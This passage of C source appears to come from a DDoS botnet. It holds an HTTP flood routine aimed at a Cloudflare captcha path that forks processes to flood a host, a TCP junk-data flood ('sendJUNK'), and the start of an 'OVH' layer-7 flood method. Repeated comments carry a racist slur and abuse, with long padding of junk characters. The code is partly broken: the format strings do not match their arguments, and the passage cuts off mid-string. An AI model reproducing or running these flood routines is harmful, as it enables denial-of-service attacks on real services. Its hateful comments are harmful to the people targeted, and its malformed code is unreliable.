	sprintf(hex_3payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_3payload, host, useragents[(rand() % 36)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void sendJUNK(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *watwat = malloc(1024);
        memset(watwat, 0, 1024);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        makeRandomStr(watwat, 1024);
                                        if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}


void ovhl7(char *host, in_port_t port, int timeEnd, int power) {//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    char request[512], buffer[1], pgetData[2048];//OVH METHOD BY BLAZING!//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    sprintf(pgetData, "\x00","\x01","\x02",//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosb
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES